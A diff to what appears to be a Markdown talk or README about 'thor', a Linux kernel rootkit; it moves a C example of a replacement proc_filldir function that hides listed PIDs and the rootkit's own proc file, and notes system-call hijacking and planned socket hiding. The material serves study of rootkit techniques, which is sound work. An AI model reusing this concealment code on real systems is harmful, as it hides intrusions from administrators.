@@ -67,7 +67,7 @@ administration tools useless.
 
 ## Problems
 
-- little example code for up2date kernels
+- few example code for up2date kernels
 - Headers do not export enough, hence complete source is required
 - hijacking systemcalls is not really encouraged by the developers (race
   conditions / undefined behaviour)
@@ -81,28 +81,7 @@ administration tools useless.
 - hiding of sockets ... work in progress
 - working in 3.14 (Arch LTS) and 3.17 (Arch Current)
 
-## Example: new `proc_filldir()`
-
-```{.c .numberLines}
-static int thor_proc_filldir(void *buf, const char *name, int namelen,
-        loff_t offset, u64 ino, unsigned d_type)
-{
-    struct _pid_list *tmp;
-
-    // hide specified PIDs
-    list_for_each_entry(tmp, &(pid_list.list), list)
-    {
-        if(0 == strcmp(name, tmp->name)) return 0;
-    }
-
-    // hide thor itself
-    if (0 == strcmp(name, THOR_PROCFILE)) return 0;
-
-    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
-}
-```
-
-## Injection `prochidder_init()`
+## Example: Injection `prochidder_init()`
 
 ```{.c .numberLines}
 static int __init prochidder_init(void)
@@ -147,6 +126,27 @@ static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
     *ctx_actor = orig_proc_filldir;
 
     return ret;
+}
+```
+
+## new `proc_filldir()`
+
+```{.c .numberLines}
+static int thor_proc_filldir(void *buf, const char *name, int namelen,
+        loff_t offset, u64 ino, unsigned d_type)
+{
+    struct _pid_list *tmp;
+
+    // hide specified PIDs
+    list_for_each_entry(tmp, &(pid_list.list), list)
+    {
+        if(0 == strcmp(name, tmp->name)) return 0;
+    }
+
+    // hide thor itself
+    if (0 == strcmp(name, THOR_PROCFILE)) return 0;
+
+    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
 ```
 
